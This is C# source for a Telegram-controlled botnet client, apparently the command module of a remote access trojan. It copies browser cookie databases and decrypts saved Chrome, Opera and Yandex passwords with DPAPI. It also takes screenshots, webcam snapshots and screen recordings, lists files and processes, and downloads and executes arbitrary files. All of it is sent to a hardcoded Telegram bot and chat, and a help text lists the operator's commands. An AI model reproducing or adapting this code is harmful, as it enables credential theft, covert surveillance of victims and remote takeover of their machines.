using Emgu.CV;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using SimpleJSON;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Captura;
using System.Data;
using System.Data.SQLite;
using Newtonsoft.Json;
using RestSharp;

namespace Botnet
{
    class MainFuncs
    {
        TelegramSystem ts;
        Misc misc;

        public MainFuncs(TelegramSystem ts, Misc misc)
        {
            this.ts = ts;
            this.misc = misc;
        }

        public void OpenLink(string URL)
        {
            if(URL.StartsWith("http"))
            {
                Thread thr = new Thread(() => { Process.Start(URL); });
            }
        }

        public void DownloadExecute(string URI)
        {
            Thread thr = new Thread(() =>
            {
                string filePath = misc.DownloadFileFromInternet(URI);
                Process.Start(filePath);
            });
            thr.Start();
        }

        public void GetCookieAndLoginData()
        {
            string directory = config.appData + "\\BotFiles";
            Directory.CreateDirectory(directory);
            misc.KillBrowsers();
            string username = Environment.UserName;
            string[] pathes = {
                $"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies",
                $"C:\\Users\\{username}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Cookies",
                $"C:\\Users\\{username}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies",
                $"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Cookies",
                $"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Windows\\INetCookies",
                $"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Windows\\Cookies" };

            int counter = 0;
            foreach (var path in pathes)
            {
                Console.WriteLine(path);
                Console.WriteLine(File.Exists(path));
                if (File.Exists(path))
                {
                    Console.WriteLine(File.Exists(directory + "\\" + Path.GetFileNameWithoutExtension(path) + $" {config.browsers[counter]}"));
                    if (File.Exists(directory + "\\" + Path.GetFileNameWithoutExtension(path) + $" {config.browsers[counter]}"))
                    {
                        File.Delete(directory + "\\" + Path.GetFileNameWithoutExtension(path) + $" {config.browsers[counter]}");
                        File.Copy(path, directory + "\\" + Path.GetFileNameWithoutExtension(path) + $" {config.browsers[counter]}");
                    }
                    else
                        File.Copy(path, directory + "\\" + Path.GetFileNameWithoutExtension(path) + $" {config.browsers[counter]}");
                }

                counter++;
            }
            string folder = misc.ZipFolder(directory);
            ts.SendDocument(folder, $"[COOKIES] Got {counter} cookies [{Misc.GetIp()}]");
        }

        public void GetSystem()
        {
            string name = string.Empty;
            string VideoProc = string.Empty;
            string Capacity = string.Empty;
            string procName = string.Empty;
            string mac = string.Empty;
            string response = string.Empty;
            string SysVer = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion", "ProductName", null);
            misc.GetMacAddress(out mac);
            ManagementObjectSearcher searcher2 = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
            foreach (ManagementObject queryObj in searcher2.Get())
            {
                name = queryObj["Caption"].ToString();
                VideoProc = string.Format("Семейство: {0}", queryObj["VideoProcessor"]);
                Capacity = string.Format("Обьем: {0}", queryObj["AdapterRAM"]);
            }

            ManagementObjectSearcher mos =
              new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
            foreach (ManagementObject mo in mos.Get())
            {
                procName = mo["Name"].ToString();
            }
            ComputerInfo CI = new ComputerInfo();
            ulong mem = ulong.Parse(CI.TotalPhysicalMemory.ToString());
            string ram = Math.Round(Convert.ToDouble(mem / (1024 * 1024) / 1000), 0).ToString();
            response += $"System [{Misc.GetIp()}] \n";
            response += "User name: " + Environment.UserName + "\n";
            response += ("OS Version: " + SysVer + "\n");
            if (cMain.Is64Bit())
                response += ("OS Аrchitecture: 64bit\n");
            else
                response += ("OS Аrchitecture: 32bit");
            response += ("Local drives: ");
            foreach (var loc in Environment.GetLogicalDrives())
            {
                response += (loc + " ");
            }
            response += ("\n");
            response += ("Core count: " + Environment.ProcessorCount + "\n");
            response += ("Processor name: " + procName + "\n");
            response += ("Video card: " + name + "\n");
            response += ("RAM: " + ram + " GB\n");
            response += ("\n");
            response += ("Local IP: " + misc.GetLocalIp() + "\n");
            response += ("IP: " + Misc.GetIp() + "\n");
            response += ("MAC: " + mac + "\n");
            ts.SendMessage(response);
        }

        public void GetProcess()
        {
            string response = $"Task list {Misc.GetIp()}\n";
            Process prc = new Process();
            Process[] processes = Process.GetProcesses();
            foreach (var process in processes)
            {
                response += ("ID: " + process.Id + " Name: " + process.ProcessName.ToLower() + "\n");
            }
            ts.SendMessage(response);
        }

        public void GetGPSLocation()
        {
            string mac;
            misc.GetMacAddress(out mac);
            string response = misc.DownloadString(request: "https://api.mylnikov.org/geolocation/wifi?bssid=" + mac + "&v=1.1");
            if (!string.IsNullOrEmpty(response) && !string.IsNullOrWhiteSpace(response))
            {
                var json = JSON.Parse(response);
                string lat = json["data"]["lat"].ToString().Replace("\"", "");
                string lon = json["data"]["lon"].ToString().Replace("\"", "");

                try
                {
                    using (WebClient webClient = new WebClient())
                        webClient.DownloadString($"https://api.telegram.org/bot757379845:AAGS_av1RT99Kf9BzyALTol6FzLyywIqe0U/sendlocation?chat_id=454529803&latitude={lat}&longitude={lon}");
                }
                catch (Exception ex)
                {
                    ts.SendMessage($"[ERROR] {ex.Message}");
                }
            }
            else
                ts.SendMessage($"[ERROR]");
        }

        public void ShowMessageBox(string message, string caption = "Message")
        {
            MessageBox.Show(message, caption, MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        public void KillProcess(string processID)  //  Закрытие процесса и отправка подтверждения
        {
            Process prc = new Process();
            Process[] processes = Process.GetProcesses();
            foreach (var process in processes)
            {
                if (process.ProcessName.ToLower() == processID.ToLower())
                {
                    ts.SendMessage($"[Process killer] Process [{processID}] has been killed!");
                    process.Kill();
                }
            }
        }

        public void GetFiles(string path)
        {
            string response = $"Files and directories [{Misc.GetIp()}] [{Directory.GetCurrentDirectory()}]: \n";
            try
            {
                DirectoryInfo dir = new DirectoryInfo(path);
                foreach (var item in dir.GetDirectories())
                {
                    response += item.Name + "\n";
                }
                foreach (var item in dir.GetFiles())
                {
                    response += item.Name + "\n";
                }

                ts.SendMessage(response);
            }
            catch (Exception ex) { ts.SendMessage($"[ERROR] [{Misc.GetIp()}] {ex.Message}"); }
        }

        public void DownloadFile(string path)
        {
            if (File.Exists(path))
                ts.SendDocument(path, $"DownloadFile [{Misc.GetIp()}]");
            else
                ts.SendMessage($"[File downloader] File doesn't exists.");
        }

        public void SnapShotCam()
        {
            using (var capture = new VideoCapture())
            {
                Bitmap image = capture.QueryFrame().Bitmap; //take a picture
                image.Save(config.appData + "\\BotFiles\\webcam.png", ImageFormat.Png);
            }
            ts.SendDocument(config.appData + "\\BotFiles\\webcam.png", "[ScreenShot] Screenshot like document.");
        }

        public void CaptureScreen(int delay)
        {
            var recorder = new Recorder(new RecorderParams(config.appData + "\\BotFiles\\capturescreen.avi", 24, SharpAvi.KnownFourCCs.Codecs.MotionJpeg, 70));
            Thread.Sleep(delay * 1000);
            recorder.Dispose();
            string path = misc.ZipFile(config.appData + "\\BotFiles\\capturescreen.avi");
            ts.SendDocument(path, "[CaptureScreen] Video from screen");
        }

        public void TakeScreenShot()
        {
            Graphics gr;

            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);

            gr = Graphics.FromImage(bmp);
            gr.CopyFromScreen(0, 0, 0, 0, bmp.Size);
            bmp.Save(config.appData + "\\BotFiles\\screen.png", ImageFormat.Png);
            ts.SendDocument(config.appData + "\\BotFiles\\screen.png", "[ScreenShot] Screenshot like document.");
        }

        public void GetGooglePasswords()
        {
            string username = Environment.UserName;
            string[] pathes = { $"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
                $"C:\\Users\\{username}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data",
                $"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Login Data",
                $"C:\\Users\\{username}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Login Data",
                $"C:\\Users\\{username}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Password Checker"};
            misc.KillBrowsers();
            try
            {
                int counter = 0;
                foreach (var db_way in pathes)
                {
                    if (File.Exists(db_way))
                    {
                        Directory.CreateDirectory($"{config.appData}\\BotFiles\\passes");
                        string filename = $"{config.appData}\\BotFiles\\passes\\pass {config.passes[counter]}.txt";
                        StreamWriter Writer = new StreamWriter(filename, false, Encoding.UTF8);
                        string db_field = "logins";
                        byte[] entropy = null;
                        string description;

                        string ConnectionString = "data source=" + db_way + ";New=True;UseUTF16Encoding=True";
                        DataTable DB = new DataTable();
                        string sql = string.Format("SELECT * FROM {0} {1} {2}", db_field, "", "");
                        using (SQLiteConnection connect = new SQLiteConnection(ConnectionString))
                        {
                            SQLiteCommand command = new SQLiteCommand(sql, connect);
                            SQLiteDataAdapter adapter = new SQLiteDataAdapter(command);
                            adapter.Fill(DB);
                            int rows = DB.Rows.Count;
                            for (int i = 0; i < rows; i++)
                            {
                                byte[] byteArray = (byte[])DB.Rows[i][5];
                                byte[] decrypted;
                                try
                                {
                                    decrypted = DPAPI.Decrypt(byteArray, entropy, out description);
                                }
                                catch (Exception)
                                {
                                    continue;
                                }
                                string password = new UTF8Encoding(true).GetString(decrypted);
                                if (password == string.Empty && DB.Rows[i][3].ToString().Trim() == string.Empty)
                                {
                                    continue;
                                }
                                else
                                {
                                    Writer.Write(i + 1 + ") "); // Here we print order number of our trinity "site-login-password"
                                    Writer.WriteLine($"URL: [{DB.Rows[i][1]}]"); // site URL
                                    Writer.WriteLine($"Login: [{DB.Rows[i][3]}]"); // login
                                    Writer.WriteLine($"Password: [{password}]");
                                    Writer.WriteLine();
                                }
                            }
                            Writer.Close();
                        }
                    }
                    counter++;
                }
                string folder = misc.ZipFolder($"{config.appData}\\BotFiles\\passes");
                ts.SendDocument(folder, "[Passwords] Well done!");
            }
            catch (Exception ex)
            {
                ts.SendMessage($"[Passwords] {ex.Message}");
            }
        }

        public void DownloadFolder(string path)
        {
            string zip = misc.ZipFolder(path);
            ts.SendDocument(zip);
        }

        public void SendCommands()
        {
            string response =
                "/open_link|<link> - open some link in browser\n" +
                "/download_execute|<link> - download and instant open file\n" +
                "/exit - close bot\n/ddos|<ip>|<threads> - in developing" +
                "\n/GetCookieFile - get cookies from browsers\n" +
                "/GetSystem - get system specs\n" +
                "/GetProcess - get tasklist\n" +
                "/GetGPSLocation - get gps location of bot (doesnt work)" +
                "/KillProcess|<process name> - kill process\n" +
                "/ls|<path> - get files and folders in <path>\n" +
                "To upload update you need to attach update\n " +
                "with caption \"/UploadUpdate\" \n" +
                "To upload file and open it you need to attach file\n " +
                "with caption \"/UploadExecute\"\n" +
                "/DownloadFile|<full path to file> - download file\n" +
                "/DownloadFolder|<full path to folder> - download files from folder in zip archive\n" +
                "/SnapShotCam - get snapshot\n/TakeScreenShot - take screenshot\n" +
                "/CaptureMonitor|<video time> - capture video from monitor\n" +
                "/GetGooglePasswords - get passwords from google\n" +
                "/RecordAudio|<time in secs (5 is default)>\n" +
                "/MessageBox|<message>|<caption> - show message box\n" +
                "/OpenFile|<full path to file> - open file\n" +
                "If you wonna just send a file without execute you can simply send this file without any caption\n" +
                "If you are sending audio, photo or video file send it like a file/help - get command list";
            ts.SendMessage(response);
        }

        public void GetProviderData()
        {
            string link = "https://ipapi.co/json/";
            string strIpLocation = " ";
            var client = new RestClient(link);
            var request = new RestRequest()
            {
                Method = Method.GET
            };

            var response = client.Execute(request);

            var providerData = JsonConvert.DeserializeObject<ProviderData>(response.Content);

            strIpLocation = $"IP: {providerData.IP}\r\n" +
                $"City: {providerData.City}\r\n" +
                $"Region: {providerData.Region}\r\n" +
                $"Country: {providerData.Country}\r\n" +
                $"Org: {providerData.Org}\r\n" +
                $"Calling code: {providerData.CallingCode}\r\n" +
                $"Timezone: {providerData.Timezone}\r\n";

            ts.SendMessage(strIpLocation);
        }
    }
}
